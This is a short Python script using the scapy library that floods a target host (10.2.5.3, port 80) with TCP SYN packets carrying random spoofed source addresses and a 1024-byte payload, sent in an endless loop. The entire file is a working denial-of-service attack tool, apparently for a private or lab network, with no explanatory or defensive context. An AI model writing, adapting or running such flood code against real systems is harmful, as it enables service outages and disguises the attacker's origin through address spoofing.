from scapy.all import *

target_ip = "10.2.5.3"                                      # Enter target IP
target_port = 80                                            # Enter target port

ip = ip = IP(src=RandIP("10.2.5.0/24"), dst=target_ip)      # Spoofing source IP
tcp = TCP(sport=RandShort(), dport=target_port, flags="S") 
raw = Raw(b"X"*1024)
p = ip / tcp / raw                                          # Form packet

send(p, loop=1)                                             # Send packet